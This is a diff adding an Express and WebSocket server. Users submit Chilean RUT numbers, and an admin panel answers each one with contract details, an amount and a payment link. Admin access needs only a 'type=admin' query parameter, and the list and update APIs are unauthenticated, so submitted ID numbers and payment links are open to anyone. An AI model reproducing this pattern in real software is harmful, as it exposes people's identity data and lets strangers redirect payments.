@@ -1,0 +1,363 @@
+import type { Express, Request, Response } from "express";
+import { createServer, type Server } from "http";
+import { WebSocketServer, WebSocket } from "ws";
+import type { WebSocket as WebSocketType } from "ws";
+import { storage } from "./storage";
+
+// Store active clients and payment requests
+interface PaymentRequest {
+  rut: string;
+  id: string;
+  status: 'pending' | 'processing' | 'completed' | 'rejected';
+  timestamp: number;
+  response?: string;
+  // Nuevos campos para el panel de control
+  contractNumber?: string;
+  vehicleType?: string;
+  amount?: string;
+  paymentLink?: string;
+}
+
+interface AdminClient {
+  ws: WebSocket;
+  isAdmin: boolean;
+}
+
+interface UserClient {
+  ws: WebSocket;
+  requestId?: string;
+  clientId: string;
+}
+
+// Usar un array para las solicitudes
+const paymentRequests: PaymentRequest[] = [];
+const adminClients: AdminClient[] = [];
+const userClients: UserClient[] = [];
+
+// DEBUG: Create a test payment request
+const testId = 'test-id-123';
+const testRequest: PaymentRequest = {
+  id: testId,
+  rut: '12.345.678-9',
+  status: 'pending',
+  timestamp: Date.now(),
+  contractNumber: '',
+  vehicleType: '',
+  amount: '',
+  paymentLink: ''
+};
+paymentRequests.push(testRequest);
+console.log(`[DEBUG] Created test payment request with ID: ${testId}`);
+
+// Generate unique ID
+function generateId(): string {
+  return Math.random().toString(36).substring(2, 15) + 
+         Math.random().toString(36).substring(2, 15);
+}
+
+export async function registerRoutes(app: Express): Promise<Server> {
+  // API routes
+  app.get("/api/health", (_req, res) => {
+    res.json({ status: "healthy" });
+  });
+
+  // API to create a payment request
+  app.post("/api/payment-request", (req: Request, res: Response) => {
+    const { rut } = req.body;
+    
+    if (!rut) {
+      return res.status(400).json({ error: "RUT is required" });
+    }
+    
+    const requestId = generateId();
+    const paymentRequest: PaymentRequest = {
+      rut,
+      id: requestId,
+      status: 'pending',
+      timestamp: Date.now()
+    };
+    
+    paymentRequests.push(paymentRequest);
+    
+    // Notify all admin clients about the new payment request
+    adminClients.forEach(client => {
+      if (client.ws.readyState === WebSocket.OPEN) {
+        client.ws.send(JSON.stringify({ 
+          type: 'new_request', 
+          request: paymentRequest 
+        }));
+      }
+    });
+    
+    return res.status(201).json({ requestId });
+  });
+  
+  // API to check payment request status
+  app.get("/api/payment-request/:id", (req: Request, res: Response) => {
+    const { id } = req.params;
+    const request = paymentRequests.find(req => req.id === id);
+    
+    if (!request) {
+      return res.status(404).json({ error: "Payment request not found" });
+    }
+    
+    return res.json(request);
+  });
+  
+  // API to get all payment requests (para el panel de admin)
+  app.get("/api/payment-requests", (_req: Request, res: Response) => {
+    console.log(`Enviando ${paymentRequests.length} solicitudes a través de API`);
+    return res.json(paymentRequests);
+  });
+  
+  // API para actualizar solicitudes (para el panel de admin)
+  app.post("/api/payment-request/:id/update", (req: Request, res: Response) => {
+    const { id } = req.params;
+    const { status, response, contractNumber, vehicleType, amount, paymentLink } = req.body;
+    
+    console.log(`Actualizando solicitud ${id}:`, req.body);
+    
+    const requestIndex = paymentRequests.findIndex(req => req.id === id);
+    if (requestIndex === -1) {
+      return res.status(404).json({ error: 'Solicitud no encontrada' });
+    }
+    
+    // Actualizar la solicitud
+    const updatedRequest = {
+      ...paymentRequests[requestIndex],
+      status,
+      response,
+      contractNumber,
+      vehicleType,
+      amount,
+      paymentLink
+    };
+    
+    paymentRequests[requestIndex] = updatedRequest;
+    
+    // Notificar a los clientes conectados sobre el cambio
+    userClients.forEach(client => {
+      if (client.requestId === id && client.ws.readyState === WebSocket.OPEN) {
+        client.ws.send(JSON.stringify({
+          type: "request_update",
+          request: updatedRequest
+        }));
+      }
+    });
+    
+    // Notificar a todos los administradores
+    adminClients.forEach(client => {
+      if (client.ws.readyState === WebSocket.OPEN) {
+        client.ws.send(JSON.stringify({
+          type: "request_updated",
+          request: updatedRequest
+        }));
+      }
+    });
+    
+    res.json(updatedRequest);
+  });
+
+  // Create HTTP server
+  const httpServer = createServer(app);
+  
+  // Setup WebSocket server with a specific path
+  const wss = new WebSocketServer({ 
+    server: httpServer,
+    path: '/ws'
+  });
+  
+  wss.on('connection', (ws: WebSocket, req) => {
+    const url = new URL(req.url || '', `http://${req.headers.host}`);
+    const clientType = url.searchParams.get('type') || 'user';
+    const requestId = url.searchParams.get('requestId');
+    
+    console.log(`New WebSocket connection: ${clientType}`);
+    
+    if (clientType === 'admin') {
+      // Admin client
+      const admin: AdminClient = { ws, isAdmin: true };
+      adminClients.push(admin);
+      
+      // Send list of all payment requests to new admin
+      console.log(`Enviando ${paymentRequests.length} solicitudes al nuevo admin`);
+      
+      ws.send(JSON.stringify({ 
+        type: 'requests_list', 
+        requests: paymentRequests 
+      }));
+      
+      ws.on('message', (message) => {
+        try {
+          const data = JSON.parse(message.toString());
+          
+          if (data.type === 'update_request') {
+            console.log('Admin update request received:', data);
+            const { requestId, status, response, contractNumber, vehicleType, amount, paymentLink } = data;
+            console.log('Admin update data extracted:', { 
+              requestId, 
+              status, 
+              response, 
+              contractNumber, 
+              vehicleType, 
+              amount, 
+              paymentLink 
+            });
+            
+            const requestIndex = paymentRequests.findIndex(req => req.id === requestId);
+            
+            if (requestIndex !== -1) {
+              console.log('Updating request with ID:', requestId);
+              const request = paymentRequests[requestIndex];
+              console.log('Original request:', JSON.stringify(request));
+              
+              // Actualizar el estado y respuesta
+              request.status = status;
+              if (response !== undefined) {
+                console.log('Setting response to:', response);
+                request.response = response;
+              }
+              
+              // Actualizar nuevos campos si están presentes
+              if (contractNumber !== undefined) {
+                console.log('Setting contractNumber to:', contractNumber);
+                request.contractNumber = contractNumber;
+              }
+              
+              if (vehicleType !== undefined) {
+                console.log('Setting vehicleType to:', vehicleType);
+                request.vehicleType = vehicleType;
+              }
+              
+              if (amount !== undefined) {
+                console.log('Setting amount to:', amount);
+                request.amount = amount;
+              }
+              
+              if (paymentLink !== undefined) {
+                console.log('Setting paymentLink to:', paymentLink);
+                request.paymentLink = paymentLink;
+              }
+              
+              console.log('Updated request:', JSON.stringify(request));
+              
+              // Find user client with this requestId and notify them
+              console.log('Looking for user clients with requestId:', requestId);
+              
+              // Solo notificar a los clientes que están viendo esta solicitud específica
+              let userNotified = false;
+              for (const client of userClients) {
+                if (client.requestId === requestId && client.ws.readyState === WebSocket.OPEN) {
+                  console.log(`Sending update to user client ${client.clientId} for request ${requestId}`);
+                  const updateMessage = JSON.stringify({ 
+                    type: 'request_update',
+                    request
+                  });
+                  console.log('User update message:', updateMessage);
+                  client.ws.send(updateMessage);
+                  userNotified = true;
+                }
+              }
+              
+              if (!userNotified) {
+                console.log('No matching user client found to notify for requestId:', requestId);
+              }
+              
+              // Notify ALL admins about the update (including the one that made the change)
+              console.log('Notifying ALL admin clients about update for request:', requestId);
+              let adminNotifyCount = 0;
+              for (const adminClient of adminClients) {
+                if (adminClient.ws.readyState === WebSocket.OPEN) {
+                  try {
+                    const updateMessage = JSON.stringify({ 
+                      type: 'request_updated', 
+                      request 
+                    });
+                    console.log(`Sending to admin client update:`, updateMessage);
+                    adminClient.ws.send(updateMessage);
+                    adminNotifyCount++;
+                  } catch (err) {
+                    console.error('Error sending admin update:', err);
+                  }
+                }
+              }
+              console.log(`Notified ${adminNotifyCount} admin clients`);
+            }
+          }
+        } catch (err) {
+          console.error('Error parsing admin message:', err);
+        }
+      });
+      
+      ws.on('close', () => {
+        const index = adminClients.findIndex(a => a.ws === ws);
+        if (index !== -1) {
+          adminClients.splice(index, 1);
+        }
+        console.log('Admin client disconnected');
+      });
+    } else {
+      // User client
+      const clientId = generateId();
+      const userClient: UserClient = { ws, clientId };
+      
+      console.log(`New user client connected with ID: ${clientId}`);
+      
+      if (requestId) {
+        console.log(`User client has requestId: ${requestId}`);
+        userClient.requestId = requestId;
+        const request = paymentRequests.find(req => req.id === requestId);
+        
+        if (request) {
+          console.log(`Found request for ID ${requestId}:`, JSON.stringify(request));
+          // Send initial state to user
+          const statusMessage = JSON.stringify({ 
+            type: 'request_status',
+            request
+          });
+          console.log(`Sending initial status to user:`, statusMessage);
+          ws.send(statusMessage);
+        } else {
+          console.log(`No request found for ID: ${requestId}`);
+        }
+      } else {
+        console.log(`User client connected without a requestId`);
+      }
+      
+      // Add client to the array
+      userClients.push(userClient);
+      console.log(`Active user clients: ${userClients.length}`);
+      
+      ws.on('message', (message) => {
+        try {
+          const data = JSON.parse(message.toString());
+          console.log('User message:', data);
+          
+          if (data.type === 'register_request' && data.requestId) {
+            userClient.requestId = data.requestId;
+            const request = paymentRequests.find(req => req.id === data.requestId);
+            
+            if (request) {
+              ws.send(JSON.stringify({ 
+                type: 'request_status',
+                request
+              }));
+            }
+          }
+        } catch (err) {
+          console.error('Error parsing user message:', err);
+        }
+      });
+      
+      ws.on('close', () => {
+        const index = userClients.findIndex(c => c.ws === ws);
+        if (index !== -1) {
+          userClients.splice(index, 1);
+        }
+        console.log('User client disconnected');
+      });
+    }
+  });
+
+  return httpServer;
+}
